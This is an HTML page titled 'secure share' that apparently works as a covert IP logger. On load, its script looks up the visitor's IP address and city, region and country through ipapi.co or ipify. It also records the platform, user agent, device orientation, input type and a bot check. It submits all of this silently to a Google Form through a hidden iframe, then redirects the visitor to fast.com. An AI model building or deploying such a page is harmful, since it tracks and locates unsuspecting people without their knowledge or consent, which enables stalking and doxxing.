<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>secure share</title>
</head>
<body>
    <iframe name="hidden_iframe" id="hidden_iframe" style="display:none;"></iframe>

    <form id="fihForm" action="https://docs.google.com/forms/d/e/1FAIpQLSfxqy0_lRSfkAZYDpBs03WMirvA2EvDN1cgJjGC7V9gpmd-3Q/formResponse" method="POST" target="hidden_iframe">
        <input type="hidden" id="entry1" name="entry.1700331025">
        <input type="hidden" id="entry2" name="entry.1010750550">
        <input type="hidden" id="entry3" name="entry.901079966">
        <input type="hidden" id="entry4" name="entry.149520676">
        <input type="hidden" id="entry5" name="entry.785981770">
    </form>

    <script>
        let orientationData = "Not Available";

        window.addEventListener('deviceorientation', (event) => {
            if (event.beta !== null && event.gamma !== null) {
                orientationData = `Beta: ${event.beta.toFixed(1)}°, Gamma: ${event.gamma.toFixed(1)}°`;
            }
        });

        async function collectAndSend() {
            let clientIp = "Unknown";
            let location = "Unknown";

            try {
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), 3000);
                const res = await fetch('https://ipapi.co/json/', { signal: controller.signal });
                clearTimeout(timeoutId);
                const data = await res.json();
                clientIp = data.ip || "Unknown";
                location = [data.city, data.region, data.country_name].filter(Boolean).join(", ") || "Unknown";
            } catch (e) {
                try {
                    const res2 = await fetch('https://api.ipify.org?format=json');
                    const data2 = await res2.json();
                    clientIp = data2.ip || "Unknown";
                } catch (err) {}
            }

            await new Promise(resolve => setTimeout(resolve, 400));

            const botCheck = navigator.webdriver ? "Bot" : "Human";
            const interfaceType = (navigator.maxTouchPoints > 0 || 'ontouchstart' in window) ? "Touch" : "Mouse/Keyboard";
            const entry4Value = `${botCheck}, Angle: ${orientationData}, Interface: ${interfaceType}`;

            document.getElementById('entry1').value = clientIp;
            document.getElementById('entry2').value = location;
            document.getElementById('entry3').value = navigator.platform || "Unknown";
            document.getElementById('entry4').value = entry4Value;
            document.getElementById('entry5').value = navigator.userAgent || "Unknown";

            document.getElementById('fihForm').submit();

            setTimeout(() => {
                window.location.href = "https://fast.com";
            }, 800);
        }

        window.onload = collectAndSend;
    </script>
</body>
</html>
